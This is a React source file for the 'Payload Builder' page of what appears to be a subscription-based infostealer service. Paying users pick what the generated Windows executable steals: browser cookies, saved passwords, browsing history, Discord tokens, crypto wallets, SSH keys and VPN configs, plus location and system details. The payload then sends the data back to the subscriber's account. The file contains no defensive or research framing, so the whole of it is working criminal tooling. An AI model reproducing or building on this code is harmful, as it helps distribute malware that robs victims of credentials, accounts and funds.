import React, { useState, useEffect } from 'react';
import {
    Box,
    Paper,
    Typography,
    FormControlLabel,
    Checkbox,
    Button,
    Grid,
    Card,
    CardContent,
    Alert,
    LinearProgress,
    Chip,
    TextField
} from '@mui/material';
import { 
    Download as DownloadIcon, 
    Build as BuildIcon,
    LockOutlined as LockIcon,
    CheckCircle as CheckCircleIcon,
    Warning as WarningIcon
} from '@mui/icons-material';

function PayloadBuilderPage() {
    const [selectedFeatures, setSelectedFeatures] = useState({
        location: true,
        systemInfo: true,
        runningProcesses: true,
        installedApps: true,
        browserCookies: true,
        savedPasswords: true,
        browserHistory: true,
        discordTokens: true,
        cryptoWallets: true,
        importantFiles: true
    });

    const [isGenerating, setIsGenerating] = useState(false);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');
    const [userInfo, setUserInfo] = useState(null);
    const [outputName, setOutputName] = useState('');
    const [subscription, setSubscription] = useState(null);
    const [loadingSubscription, setLoadingSubscription] = useState(true);

    useEffect(() => {
        // Get current user info
        const storedUserInfo = localStorage.getItem('userInfo');
        if (storedUserInfo) {
            try {
                const parsed = JSON.parse(storedUserInfo);
                setUserInfo(parsed);
            } catch (e) {
                console.error('Error parsing user info:', e);
            }
        }
        
        // Fetch subscription status
        fetchSubscription();
    }, []);

    const fetchSubscription = async () => {
        try {
            const token = localStorage.getItem('authToken');
            const response = await fetch('/api/subscription', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                setSubscription(data);
            } else {
                setSubscription({ isActive: false, type: 'none', daysRemaining: 0 });
            }
        } catch (err) {
            console.error('Error fetching subscription:', err);
            setSubscription({ isActive: false, type: 'none', daysRemaining: 0 });
        } finally {
            setLoadingSubscription(false);
        }
    };

    // Helper to display truncated key for privacy (first 8 chars + ...)
    const getDisplayKey = (key) => {
        if (!key) return 'unknown';
        if (key.length <= 10) return key;
        return key.substring(0, 8) + '...';
    };

    const features = [
        {
            key: 'location',
            title: 'Location Information',
            description: 'Collects IP address, country, city, and coordinates',
            category: 'Basic'
        },
        {
            key: 'systemInfo',
            title: 'System Information',
            description: 'Collects OS version, hardware specs, and system details',
            category: 'Basic'
        },
        {
            key: 'runningProcesses',
            title: 'Running Processes',
            description: 'Lists all currently running applications and processes',
            category: 'System'
        },
        {
            key: 'installedApps',
            title: 'Installed Applications',
            description: 'Scans for installed software and applications',
            category: 'System'
        },
        {
            key: 'browserCookies',
            title: 'Browser Cookies',
            description: 'Extracts cookies from Chrome, Edge, Firefox, and other browsers',
            category: 'Browser'
        },
        {
            key: 'savedPasswords',
            title: 'Saved Passwords',
            description: 'Extracts saved login credentials from browsers',
            category: 'Browser'
        },
        {
            key: 'browserHistory',
            title: 'Browser History',
            description: 'Collects browsing history from all installed browsers',
            category: 'Browser'
        },
        {
            key: 'discordTokens',
            title: 'Discord Tokens',
            description: 'Extracts Discord authentication tokens and user data',
            category: 'Applications'
        },
        {
            key: 'cryptoWallets',
            title: 'Crypto Wallets',
            description: 'Scans for cryptocurrency wallet files and data',
            category: 'Applications'
        },
        {
            key: 'importantFiles',
            title: 'Important Files',
            description: 'Collects configuration files, SSH keys, VPN configs, and other sensitive files',
            category: 'Files'
        }
    ];

    const categories = ['Basic', 'System', 'Browser', 'Applications', 'Files'];

    const handleFeatureChange = (featureKey) => (event) => {
        setSelectedFeatures(prev => ({
            ...prev,
            [featureKey]: event.target.checked
        }));
    };

    const handleSelectAll = (category, select) => {
        const categoryFeatures = features.filter(f => f.category === category);
        const newState = { ...selectedFeatures };
        categoryFeatures.forEach(feature => {
            newState[feature.key] = select;
        });
        setSelectedFeatures(newState);
    };

    const handleGeneratePayload = async () => {
        setIsGenerating(true);
        setError('');
        setSuccess('');

        try {
            const token = localStorage.getItem('authToken');
            if (!token) {
                throw new Error('Not authenticated');
            }

            // Generate filename - use custom name or default (use short key for filename)
            const shortKey = userInfo?.username ? userInfo.username.substring(0, 8) : 'unknown';
            const finalOutputName = outputName.trim() || `payload_${shortKey}_${Date.now()}`;

            const response = await fetch('/api/payloads/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    features: selectedFeatures,
                    user: userInfo?.username,
                    outputName: finalOutputName
                })
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({ message: 'Server error' }));
                
                // Handle subscription error specifically
                if (errorData.subscriptionRequired) {
                    setSubscription(prev => ({ ...prev, isActive: false }));
                }
                
                throw new Error(errorData.message || `Server error: ${response.status}`);
            }

            // Create download link
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            // Use the custom name or default, ensure .exe extension
            let downloadName = finalOutputName;
            if (!downloadName.toLowerCase().endsWith('.exe')) {
                downloadName += '.exe';
            }
            a.download = downloadName;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);

            setSuccess('Payload generated and downloaded successfully!');
        } catch (err) {
            console.error('Error generating payload:', err);
            setError(err.message || 'Failed to generate payload');
        } finally {
            setIsGenerating(false);
        }
    };

    const getSelectedCount = (category) => {
        return features.filter(f => f.category === category && selectedFeatures[f.key]).length;
    };

    const getTotalSelected = () => {
        return Object.values(selectedFeatures).filter(Boolean).length;
    };

    const formatExpiryDate = (dateStr) => {
        if (!dateStr) return 'N/A';
        const date = new Date(dateStr);
        return date.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
    };

    const hasActiveSubscription = subscription?.isActive;

    return (
        <Box sx={{ p: 3 }}>
            <Typography variant="h4" gutterBottom sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <BuildIcon />
                Payload Builder
            </Typography>

            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                Create custom payloads that will collect data and send it to your account.
                {userInfo?.username && (
                    <span> Logs will be attributed to: <strong>{getDisplayKey(userInfo.username)}</strong></span>
                )}
            </Typography>

            {/* Subscription Status Card */}
            <Paper 
                sx={{ 
                    p: 2, 
                    mb: 3, 
                    border: hasActiveSubscription ? '1px solid #22c55e' : '1px solid #ef4444',
                    backgroundColor: hasActiveSubscription ? 'rgba(34, 197, 94, 0.1)' : 'rgba(239, 68, 68, 0.1)'
                }}
            >
                <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 2 }}>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
                        {loadingSubscription ? (
                            <Typography color="text.secondary">Loading subscription status...</Typography>
                        ) : hasActiveSubscription ? (
                            <>
                                <CheckCircleIcon sx={{ color: '#22c55e', fontSize: 28 }} />
                                <Box>
                                    <Typography variant="subtitle1" sx={{ fontWeight: 600, color: '#22c55e' }}>
                                        Subscription Active
                                    </Typography>
                                    <Typography variant="body2" color="text.secondary">
                                        {subscription.daysRemaining} days remaining • Expires {formatExpiryDate(subscription.expires)}
                                    </Typography>
                                </Box>
                            </>
                        ) : (
                            <>
                                <LockIcon sx={{ color: '#ef4444', fontSize: 28 }} />
                                <Box>
                                    <Typography variant="subtitle1" sx={{ fontWeight: 600, color: '#ef4444' }}>
                                        No Active Subscription
                                    </Typography>
                                    <Typography variant="body2" color="text.secondary">
                                        A subscription is required to build payloads
                                    </Typography>
                                </Box>
                            </>
                        )}
                    </Box>
                    <Chip 
                        label={hasActiveSubscription ? subscription.type?.toUpperCase() || 'ACTIVE' : 'INACTIVE'}
                        sx={{
                            backgroundColor: hasActiveSubscription ? '#22c55e' : '#ef4444',
                            color: '#fff',
                            fontWeight: 600
                        }}
                    />
                </Box>
            </Paper>

            {error && (
                <Alert severity="error" sx={{ mb: 2 }}>
                    {error}
                </Alert>
            )}

            {success && (
                <Alert severity="success" sx={{ mb: 2 }}>
                    {success}
                </Alert>
            )}

            {/* Feature Selection - Disabled if no subscription */}
            <Box sx={{ opacity: hasActiveSubscription ? 1 : 0.5, pointerEvents: hasActiveSubscription ? 'auto' : 'none' }}>
                <Grid container spacing={3}>
                    {categories.map(category => (
                        <Grid item xs={12} md={6} key={category}>
                            <Card>
                                <CardContent>
                                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                                        <Typography variant="h6">{category}</Typography>
                                        <Box sx={{ display: 'flex', gap: 1 }}>
                                            <Button
                                                size="small"
                                                onClick={() => handleSelectAll(category, true)}
                                                disabled={!hasActiveSubscription || getSelectedCount(category) === features.filter(f => f.category === category).length}
                                            >
                                                Select All
                                            </Button>
                                            <Button
                                                size="small"
                                                onClick={() => handleSelectAll(category, false)}
                                                disabled={!hasActiveSubscription || getSelectedCount(category) === 0}
                                            >
                                                Deselect All
                                            </Button>
                                            <Chip
                                                label={`${getSelectedCount(category)}/${features.filter(f => f.category === category).length}`}
                                                size="small"
                                                color={getSelectedCount(category) > 0 ? "primary" : "default"}
                                            />
                                        </Box>
                                    </Box>

                                    <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                                        {features.filter(f => f.category === category).map(feature => (
                                            <FormControlLabel
                                                key={feature.key}
                                                control={
                                                    <Checkbox
                                                        checked={selectedFeatures[feature.key]}
                                                        onChange={handleFeatureChange(feature.key)}
                                                        color="primary"
                                                        disabled={!hasActiveSubscription}
                                                    />
                                                }
                                                label={
                                                    <Box>
                                                        <Typography variant="body2" fontWeight="medium">
                                                            {feature.title}
                                                        </Typography>
                                                        <Typography variant="caption" color="text.secondary">
                                                            {feature.description}
                                                        </Typography>
                                                    </Box>
                                                }
                                            />
                                        ))}
                                    </Box>
                                </CardContent>
                            </Card>
                        </Grid>
                    ))}
                </Grid>

                <Paper sx={{ p: 3, mt: 3, bgcolor: 'background.paper' }}>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 2 }}>
                        <Box sx={{ flex: 1, minWidth: 250 }}>
                            <Typography variant="h6" gutterBottom>
                                Payload Summary
                            </Typography>
                            <Typography variant="body2" color="text.secondary">
                                {getTotalSelected()} out of {Object.keys(selectedFeatures).length} features selected
                            </Typography>
                            {userInfo?.username && (
                                <Typography variant="body2" color="text.secondary">
                                    Target Account: <strong>{getDisplayKey(userInfo.username)}</strong>
                                </Typography>
                            )}
                        </Box>

                        <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, alignItems: 'flex-end' }}>
                            <TextField
                                label="Output Filename"
                                placeholder={`payload_${userInfo?.username ? userInfo.username.substring(0, 8) : 'unknown'}_${Date.now()}`}
                                value={outputName}
                                onChange={(e) => setOutputName(e.target.value)}
                                size="small"
                                sx={{ minWidth: 280 }}
                                helperText=".exe will be added automatically if not specified"
                                disabled={!hasActiveSubscription}
                                InputProps={{
                                    endAdornment: <Typography variant="caption" color="text.secondary">.exe</Typography>
                                }}
                            />
                            <Button
                                variant="contained"
                                startIcon={hasActiveSubscription ? <DownloadIcon /> : <LockIcon />}
                                onClick={handleGeneratePayload}
                                disabled={!hasActiveSubscription || isGenerating || getTotalSelected() === 0}
                                size="large"
                                sx={{ 
                                    minWidth: 200,
                                    backgroundColor: hasActiveSubscription ? undefined : '#64748b',
                                    '&:disabled': {
                                        backgroundColor: '#475569',
                                        color: '#94a3b8'
                                    }
                                }}
                            >
                                {!hasActiveSubscription ? 'Subscription Required' : (isGenerating ? 'Generating...' : 'Generate Payload')}
                            </Button>
                        </Box>
                    </Box>

                    {isGenerating && (
                        <Box sx={{ mt: 2 }}>
                            <LinearProgress />
                            <Typography variant="body2" color="text.secondary" sx={{ mt: 1 }}>
                                Building custom payload executable...
                            </Typography>
                        </Box>
                    )}
                </Paper>
            </Box>

            {/* No Subscription Warning */}
            {!loadingSubscription && !hasActiveSubscription && (
                <Alert 
                    severity="warning" 
                    icon={<WarningIcon />}
                    sx={{ mt: 3 }}
                >
                    <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                        Subscription Required
                    </Typography>
                    <Typography variant="body2">
                        You need an active subscription to build and download payloads. Contact an administrator to activate your subscription.
                    </Typography>
                </Alert>
            )}
        </Box>
    );
}

export default PayloadBuilderPage;
